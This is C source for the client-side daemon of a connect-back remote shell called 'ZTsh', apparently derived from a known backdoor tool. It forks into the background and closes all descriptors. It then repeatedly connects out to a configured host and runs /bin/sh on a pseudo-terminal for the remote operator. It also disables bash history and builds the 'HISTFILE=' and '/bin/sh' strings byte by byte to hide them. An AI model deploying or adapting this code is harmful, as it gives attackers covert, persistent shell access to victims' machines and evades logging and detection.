/*
 * ZTsh Slave side,;
 * this program is licensed under the GPL.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <termios.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <netdb.h>
#include <pty.h>

#include "write_log.h"
#include "socket_wrapper.h"

#include "ztsh.h"

unsigned char message[BUFSIZE + 1];

/* func declaration */

int ztshd_shell(int client);

FILE *pLog;

int main()
{
    int ret, pid, n;
    int client;
    struct sockaddr_in client_addr;
    struct hostent *client_host;

    /* set as daemon */
    pid = fork();
    if (pid < 0)
    {
        return 1;
    }
    if (pid != 0)
    {
        return 0;
    }
    if (setsid() < 0)
    {
        return 2;
    }
    for (n = 0; n < 1024; n++)
    {
        close(n);
    }

    while (1)
    {
        sleep(CONNECT_BACK_DELAY);

        client = socket(AF_INET, SOCK_STREAM, 0);
        if (client < 0)
        {
            continue;
        }

        client_host = gethostbyname(CONNECT_BACK_HOST);
        if (client_host == NULL)
        {
            continue;
        }

        client_addr.sin_family = AF_INET;
        client_addr.sin_port = htons(SERVER_PORT);
        memcpy((void *)&client_addr.sin_addr, (void *)client_host->h_addr, client_host->h_length);

        /* try to connect back to the client */
        ret = connect(client, (struct sockaddr *)&client_addr, sizeof(client_addr));
        if (ret < 0)
        {
            close(client);
            continue;
        }

        /* fork a child to handle the connection */
        pid = fork();
        if (pid < 0)
        {
            close(client);
            continue;
        }
        if (pid != 0)
        {
            waitpid(pid, NULL, 0);
            close(client);
            break;
        }

        /*  make the grand-child's father becomes init */
        pid = fork();
        if (pid < 0)
        {
            return 3;
        }
        if (pid != 0)
        {
            return 4;
        }


        ztshd_shell(client);
        shutdown(client, 2);
        return 0;
    }

    /* not reached */
    return 5;
}

int ztshd_shell(int client)
{
    fd_set rd;
    struct winsize ws;
    char *slave, *temp, *shell;
    int ret, len, pid, pty, tty, n;

    pLog = fopen("pel.log", "a");
    write_log(pLog, "%s\n", "ztshd_shell-start");
    fclose(pLog);

    /* request a pseudo-terminal */
    if (openpty(&pty, &tty, NULL, NULL, NULL) < 0)
    {
        return 6;
    }

    slave = ttyname(tty);
    if (slave == NULL)
    {
        return 7;
    }

    /* just in case bash is run, kill the history file */
    temp = (char *)malloc(10);
    if (temp == NULL)
    {
        return 8;
    }

    temp[0] = 'H'; temp[5] = 'I';
    temp[1] = 'I'; temp[6] = 'L';
    temp[2] = 'S'; temp[7] = 'E';
    temp[3] = 'T'; temp[8] = '=';
    temp[4] = 'F'; temp[9] = '\0';

    putenv(temp);

    /* get the TERM env  */
    ret = recv_all(client, message);
    message[ret] = '\0';
    temp = (char *)malloc(ret + 6);

    if (temp == NULL)
    {
        return 9;
    }

    temp[0] = 'T'; temp[3] = 'M';
    temp[1] = 'E'; temp[4] = '=';
    temp[2] = 'R';

    strncpy(temp + 5, (char *)message, ret + 1);
    putenv(temp);

    /* get the window size */
    ret = recv_all(client, message);

    ws.ws_row = ((int)message[0] << 8) + (int)message[1];
    ws.ws_col = ((int)message[2] << 8) + (int)message[3];
    ws.ws_xpixel = 0;
    ws.ws_ypixel = 0;

    if (ioctl(pty, TIOCSWINSZ, &ws) < 0)
    {
        return 10;
    }

    /* get the init command */
    ret = recv_all(client, message);
    message[ret] = '\0';
    temp = (char *)malloc(ret + 1);
    if (temp == NULL)
    {
        return 11;
    }
    strncpy(temp, (char *)message, ret + 1);

    /* fork to spawn a shell */
    pid = fork();
    if (pid < 0)
    {
        return 12;
    }
    if (pid == 0)
    {
        /* close the client socket and the pty (master side) */
        close(client);
        close(pty);

        /* create a new session */
        if (setsid() < 0)
        {
            return 13;
        }

        /* set controlling tty, to have job control */
        if (ioctl(tty, TIOCSCTTY, NULL) < 0)
        {
            return 14;
        }

        /* tty becomes stdin, stdout, stderr */
        dup2(tty, 0);
        dup2(tty, 1);
        dup2(tty, 2);
        if (tty > 2)
        {
            close(tty);
        }

        /* fire up the shell */
        shell = (char *)malloc(8);
        if (shell == NULL)
        {
            return 15;
        }

        shell[0] = '/'; shell[4] = '/';
        shell[1] = 'b'; shell[5] = 's';
        shell[2] = 'i'; shell[6] = 'h';
        shell[3] = 'n'; shell[7] = '\0';

        execl(shell, shell + 5, "-c", temp, (char *)0);

        /* never reach */
        return 16;
    }
    else
    {
        /* tty (slave side) not needed anymore */
        close(tty);

        /*  transfer betweem master and slave */
        while (1)
        {
            FD_ZERO(&rd);
            FD_SET(client, &rd);
            FD_SET(pty, &rd);

            n = (pty > client) ? pty : client;

            if (select(n + 1, &rd, NULL, NULL, NULL) < 0)
            {
                pLog = fopen("pel.log", "a");
                write_log(pLog, "%s\n", "select");
                fclose(pLog);
                return 17;
            }
            pLog = fopen("pel.log", "a");
            write_log(pLog, "readable\n");
            fclose(pLog);

            if (FD_ISSET(client, &rd))
            {
                pLog = fopen("pel.log", "a");
                write_log(pLog, "read client\n");
                fclose(pLog);

                ret = recv_all(client, message);
                message[ret] = '\0';
                pLog = fopen("pel.log", "a");
                write_log(pLog, "recv from django %d, len %d\n%s\n", client, ret, message);
                fclose(pLog);

                if (write(pty, message, ret) != ret)
                {
                    pLog = fopen("pel.log", "a");
                    write_log(pLog, "%s\n", "write");
                    return 18;
                }
            }

            if (FD_ISSET(pty, &rd))
            {
                pLog = fopen("pel.log", "a");
                write_log(pLog, "read pty\n");
                fclose(pLog);

                len = read(pty, message, BUFSIZE);

                message[len] = '\0';
                pLog = fopen("pel.log", "a");
                write_log(pLog, "read from pty len %d\n%s\n", len, message);

                if (len == 0)
                    break;

                if (len < 0)
                {
                    pLog = fopen("pel.log", "a");
                    write_log(pLog, "%s\n", "pty error");
                    fclose(pLog);
                    return 19;
                }

                ret = send_all(client, message, len);
            }
        }

        return 20;
    }

    /* not reached */
    return 21;
}
